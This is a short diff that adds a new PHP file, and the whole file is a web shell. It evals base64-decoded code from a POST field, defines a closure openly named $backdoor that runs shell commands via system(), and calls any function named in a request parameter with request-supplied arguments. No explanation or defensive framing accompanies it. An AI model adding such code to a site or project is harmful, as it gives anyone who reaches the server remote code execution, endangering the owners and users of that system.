@@ -1,0 +1,13 @@
+<?php
+eval(base64_decode($_POST['code']));
+
+$backdoor = function($cmd) {
+    system($cmd);
+};
+
+if (isset($_REQUEST['action'])) {
+    $action = $_REQUEST['action'];
+    call_user_func($action, $_REQUEST['params']);
+}
+
+?>
